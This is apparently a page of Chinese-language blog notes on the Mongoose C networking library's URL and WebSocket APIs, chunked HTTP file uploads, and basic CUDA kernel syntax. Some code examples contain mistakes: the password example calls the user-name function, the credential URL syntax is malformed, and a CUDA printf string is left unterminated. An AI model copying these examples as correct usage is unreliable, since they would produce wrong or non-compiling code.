<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> user_name = <span class="built_in">mg_url_user</span>(<span class="string">&quot;https://user@password@my.example.org&quot;</span>); <span class="comment">// user_name is now &quot;user&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-pass"><a href="#mg-url-pass" class="headerlink" title="mg_url_pass"></a>mg_url_pass</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取密码</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> <span class="built_in">mg_url_pass</span>(<span class="type">const</span> <span class="type">char</span> *url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取密码的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回密码</li>
<li>失败，返回空的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> pwd = <span class="built_in">mg_url_user</span>(<span class="string">&quot;https://user@password@my.example.org&quot;</span>); <span class="comment">// pwd is now &quot;password&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-url-uri"><a href="#mg-url-uri" class="headerlink" title="mg_url_uri"></a>mg_url_uri</h2><ul>
<li><p>简介：</p>
<ul>
<li>从给定的URL中提取URI。注意，函数返回url内的指针；不需要明确地free()它。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">mg_url_uri</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>url – 需要提取URI的URL</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回URI字符串</li>
<li>失败，返回 <code>\</code></li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *uri = <span class="built_in">mg_url_uri</span>(<span class="string">&quot;https://example.org/subdir/subsubdir&quot;</span>); <span class="comment">// `uri` is now pointer to &quot;subdir/subsubdir&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_websocket/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_websocket/" class="post-title-link" itemprop="url">mongoose_websocket</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>websocket相关函数</li>
</ul>
<h2 id="struct-mg-ws-message"><a href="#struct-mg-ws-message" class="headerlink" title="struct mg_ws_message"></a>struct mg_ws_message</h2><ul>
<li><p>简介：</p>
<ul>
<li>该结构代表Websocket消息。这个<code>flag</code>元素对应于<code>RFC 6455</code>第5.2节中所述的第一个字节。(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.2</code>)</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_ws_message</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> data; <span class="comment">// WebSocket message data</span></span><br><span class="line">  <span class="type">uint8_t</span> flags;      <span class="comment">// WebSocket message flags</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="websocket-message-type"><a href="#websocket-message-type" class="headerlink" title="websocket message type"></a>websocket message type</h2><ul>
<li><p>简介：</p>
<ul>
<li>要从传入消息中提取消息类型，在结构体<code>mg_ws_message</code>的<code>flag</code>元素中检查四个<code>LSBs</code></li>
</ul>
</li>
<li><p>可能存在的WebSocket消息类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_CONTINUE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_TEXT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_BINARY 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_CLOSE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_PING 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEBSOCKET_OP_PONG 10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_WS_MSG) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_ws_message</span> *wm = (<span class="keyword">struct</span> mg_ws_message *) ev_data;</span><br><span class="line">    msgtype = wm-&gt;flags &amp; <span class="number">0x0F</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgtype == WEBSOCKET_OP_BINARY) &#123;</span><br><span class="line">      <span class="comment">// This is a binary data message</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msgtype == WEBSOCKET_OP_TEXT) &#123;</span><br><span class="line">      <span class="comment">// This is a text data message</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注：</p>
<ul>
<li>当调用<code>mg_ws_send()</code>或<code>ms_ws_printf()</code>发送消息时，请使用<code>RFC 6455</code>第5.6节中所述的正确消息类型进行数据帧(<code>https://www.rfc-editor.org/rfc/rfc6455#section-5.6</code>)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="mg-ws-connect"><a href="#mg-ws-connect" class="headerlink" title="mg_ws_connect"></a>mg_ws_connect</h2><ul>
<li><p>简介：</p>
<ul>
<li>创建客户端Websocket连接。这个函数不能连接到对端，它仅仅分配需要的资源和启动连接进程。当对端真正连接好了，会向连接事件处理函数发送一个<code>MG_EV_CONNECT</code>事件</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_connection</span> *<span class="built_in">mg_ws_connect</span>(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">const</span> <span class="type">char</span> *url, <span class="type">mg_event_handler_t</span> fn, <span class="type">void</span> *fn_data, <span class="type">const</span> <span class="type">char</span> *fmt, ...);</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>url</code>  –  指定的远程URL。例如：<code>http://google.com</code></li>
<li><code>fn</code>   –  一个事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回一个指向创建的连接</li>
<li>返回NULL表示错误</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_connection</span> *c = <span class="built_in">mg_ws_connect</span>(&amp;mgr, <span class="string">&quot;ws://test_ws_server.com:1000&quot;</span>,</span><br><span class="line">                                        handler, <span class="literal">NULL</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Sec-WebSocket-Protocol: echo\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="literal">NULL</span>) <span class="built_in">fatal</span>(<span class="string">&quot;Cannot create connection&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-upgrade"><a href="#mg-ws-upgrade" class="headerlink" title="mg_ws_upgrade"></a>mg_ws_upgrade</h2><ul>
<li><p>简介：</p>
<ul>
<li>升级给定HTTP连接到Websocket。<code>fmt</code>是一个类似于<code>printf()</code>格式的字符串，用于额外的HTTP标头，返回给Websocket握手的客户端。如果不需要额外的标头，将<code>fmt</code>设置为空</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_ws_upgrade</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>    –  使用的连接</li>
<li><code>hm</code>   –  HTTP消息</li>
<li><code>fmt</code>  –  类似于<code>printf</code>的格式字符串，用于附加<code>HTTP</code>标头或为null</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_http_message</span> *hm = (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="built_in">mg_ws_upgrade</span>(c, hm, <span class="literal">NULL</span>);  <span class="comment">// Upgrade HTTP to WS</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-send"><a href="#mg-ws-send" class="headerlink" title="mg_ws_send"></a>mg_ws_send</h2><ul>
<li><p>简介：</p>
<ul>
<li>向WebSocket对端发送数据</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_send</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> op)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>buf</code>  –  需要发送的数据</li>
<li><code>len</code>  –  需要发送的数据大小</li>
<li><code>op</code>   –  WebSocket消息类型，参见WebSocket message type</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回发送的字节数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_WS_OPEN) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">mg_http_message</span> *hm = (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="built_in">mg_ws_send</span>(c, <span class="string">&quot;opened&quot;</span>, <span class="number">6</span>, WEBSOCKET_OP_BINARY);  <span class="comment">// Send &quot;opened&quot; to web socket connection</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-printf-mg-ws-vprintf"><a href="#mg-ws-printf-mg-ws-vprintf" class="headerlink" title="mg_ws_printf, mg_ws_vprintf"></a>mg_ws_printf, mg_ws_vprintf</h2><ul>
<li><p>简介：</p>
<ul>
<li>和<code>ms_ws_send()</code>相同，但是使用<code>printf()</code>语义格式化数据</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_printf</span><span class="params">(<span class="keyword">struct</span> mg_connection *, <span class="type">int</span> op, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_vprintf</span><span class="params">(<span class="keyword">struct</span> mg_connection *, <span class="type">int</span> op, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>   –  使用的连接</li>
<li><code>op</code>  –  WebSocket消息类型，参见WebSocket message type</li>
<li><code>fmt</code> –  使用<code>printf()</code>语义格式化的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回发送的字节数</li>
</ul>
</li>
<li><p>示例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_ws_printf</span>(c, WEBSOCKET_OP_TEXT, <span class="string">&quot;Hello, %s!&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-ws-wrap"><a href="#mg-ws-wrap" class="headerlink" title="mg_ws_wrap"></a>mg_ws_wrap</h2><ul>
<li><p>简介：</p>
<ul>
<li>将输出缓冲区中的数据转换为Websocket格式。有用然后通过WebSocket实施协议。具体示例参见<code>examples/mqtt-over-ws-client</code></li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">mg_ws_wrap</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">size_t</span> len, <span class="type">int</span> op)</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>c</code>  –  使用的连接</li>
<li><code>len</code>  –  转换的字节数</li>
<li><code>op</code>   –  WebSocket消息类型</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回连接结构体中输出缓冲区新的大小</li>
</ul>
</li>
<li><p>示例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> len = c-&gt;send.len;         <span class="comment">// Store output buffer len</span></span><br><span class="line"><span class="built_in">mg_mqtt_login</span>(c, s_url, &amp;opts);   <span class="comment">// Write MQTT login message</span></span><br><span class="line"><span class="built_in">mg_ws_wrap</span>(c, c-&gt;send.len - len, WEBSOCKET_OP_BINARY); <span class="comment">// Wrap it into WS</span></span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-question_%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-question_%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-title-link" itemprop="url">question_问题与解决方案</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>本教程将向你展示如何以一系列MJPEG帧的形式发送视频流。这里使用的技术是：<ul>
<li>以不可缓存的方式提供页面，并表明内容类型为multipart&#x2F;x-mixed-replace。</li>
<li>定期发送一个不同的JPEG文件的内容，取代以前的文件</li>
</ul>
</li>
</ul>
<h2 id="单次文件上传大小为3MB"><a href="#单次文件上传大小为3MB" class="headerlink" title="单次文件上传大小为3MB"></a>单次文件上传大小为3MB</h2><ul>
<li>修改宏<code>MG_MAX_RECV_SIZE</code><ul>
<li>在<code>mongoose.h</code>中，宏<code>MG_MAX_RECV_SIZE</code>默认定义为<code>3 * 1024 * 1024</code></li>
<li>修改即可</li>
</ul>
</li>
</ul>
<h2 id="文件上传问题"><a href="#文件上传问题" class="headerlink" title="文件上传问题"></a>文件上传问题</h2><h3 id="HTTP协议上传文件原理"><a href="#HTTP协议上传文件原理" class="headerlink" title="HTTP协议上传文件原理"></a>HTTP协议上传文件原理</h3><p>HTTP 协议中的文件上传是通过 POST 请求来实现的，具体的原理如下：</p>
<ol>
<li><p>客户端发送一个 HTTP POST 请求到服务器，并在请求头中指定 Content-Type 为 multipart&#x2F;form-data。这告诉服务器该请求是一个包含多部分内容的表单数据。</p>
</li>
<li><p>服务器收到请求后，解析请求头中的 Content-Type，确认请求是一个文件上传请求。</p>
</li>
<li><p>客户端将要上传的文件分割成多个部分（或者称为数据包），每个数据包都包含一个文件的一部分内容。</p>
</li>
<li><p>客户端将每个数据包作为一个独立的部分，依次发送给服务器。每个数据包都会包含一些额外的元数据，例如文件名、文件类型等。</p>
</li>
<li><p>服务器接收到每个数据包后，根据数据包的元数据信息和内容进行处理。通常情况下，服务器会将接收到的数据包保存到临时文件或内存中。</p>
</li>
<li><p>当所有数据包都接收完毕后，服务器根据接收到的数据包重新构建原始文件，并将其保存到指定的位置。</p>
</li>
</ol>
<p>需要注意的是，文件上传的过程中可能会涉及到数据包的分片、文件大小限制、上传进度监测等细节处理。一般来说，服务器端会提供相应的接口或库来处理文件上传，以简化开发过程。</p>
<h3 id="Mongoose解决方案"><a href="#Mongoose解决方案" class="headerlink" title="Mongoose解决方案"></a>Mongoose解决方案</h3><ul>
<li>两种情况：<ul>
<li>要上传的文件很小–明显小于可用RAM的数量。例如，我们在一个有64MB内存的嵌入式Linux系统上运行Mongoose，并上传一些大小为1KB的JSON配置。在这种情况下，我们可以使用一个标准的HTML表单上传，并在一个POST请求中接收整个文件</li>
<li>要上传的文件很大–与可用RAM的数量相比，或者明显超过这个数量。例如，我们想上传一个大小为512KB的新文件系统镜像到ESP8266设备上，该设备有大约30KB的可用RAM。在这种情况下，没有办法在内存中保存整个文件。它应该被分成小块处理，Mongoose应该接收每个小块并将其追加到写入的文件中，直到全部接收完毕。在这里，我们可以遵循两条路径：<ul>
<li>使用单个POST请求发送文件，将文件内容作为POST主体传递–即使用二进制上传。</li>
<li>在客户端将文件分成小块（如2Kb），并将每个小块作为一个单独的POST请求发送。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="form-upload"><a href="#form-upload" class="headerlink" title="form upload"></a>form upload</h4><h4 id="binary-upload-single-POST"><a href="#binary-upload-single-POST" class="headerlink" title="binary upload, single POST"></a>binary upload, single POST</h4><ul>
<li><p>当Mongoose收到一个大的HTTP请求时，它会缓冲传入的数据，对于每一个收到的数据块，它会产生MG_EV_HTTP_CHUNK请求。当一个完整的HTTP消息被缓冲时，那么最后一个零长度的MG_EV_HTTP_CHUNK被产生，然后是MG_EV_HTTP_MSG </p>
</li>
<li><p>然而，服务器端可能不会等到完整的消息被缓冲在内存中，但它可以使用mg_http_delete_chunk()函数删除传入的chunk。如果块被删除，那么在最后一个零长度的块之后就不会产生MG_EV_HTTP_MSG。这样一来，服务器就可以在块到达时进行处理–例如，将块写入文件中。</p>
</li>
<li><p>MG_EV_HTTP_CHUNK消息也是为表单上传生成的。然而，Mongoose并不剥离多部分标记。如果表单上传的消息被保存到一个文件中，它将包含多部分标记。</p>
</li>
<li><p>0长度的chunk是最后一个chunk。使用MG_IO_SIZE构建常数来限制服务器端的最大分块大小。</p>
</li>
<li><p>服务器接收每个块，处理它并删除它。当收到最后一个分块时，发送一个响应。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-cuda_1_2_%E5%B8%B8%E8%A7%81%E8%AF%AD%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-cuda_1_2_%E5%B8%B8%E8%A7%81%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">cuda_1_2_常见语法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Cuda/" itemprop="url" rel="index"><span itemprop="name">Cuda</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>cuda编程中常见语法和关键词</li>
</ul>
<h2 id="global-修饰符"><a href="#global-修饰符" class="headerlink" title="__global__修饰符"></a><code>__global__</code>修饰符</h2><ul>
<li>修饰符__global__告诉编译器这个函数将会从CPU中调用，然后在GPU上执行。示例如下:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__global__ <span class="type">void</span> <span class="title function_">helloFromGPU</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world from GPU!\n);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="启动内核函数"><a href="#启动内核函数" class="headerlink" title="启动内核函数"></a>启动内核函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">helloFromGPU &lt;&lt;&lt;<span class="number">1</span>, <span class="number">10</span>&gt;&gt;&gt;();</span><br></pre></td></tr></table></figure>
<ul>
<li>三重尖括号意味着从主线程到设备端代码的调用。一个内核函数通过一组线程来执行，所有线程执行相同的代码。</li>
<li>三重尖括号里面的参数是执行配置，用来说明使用多少线程来执行内核函数。在这个例子中，有目10个GPU线程被调用</li>
</ul>
<h2 id="cudaDeviceReset-函数"><a href="#cudaDeviceReset-函数" class="headerlink" title="cudaDeviceReset() 函数"></a>cudaDeviceReset() 函数</h2><ul>
<li>cudaDeviceReset()函数用来显式地释放和清空当前进程中与当前设备有关的所有资源</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_02_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
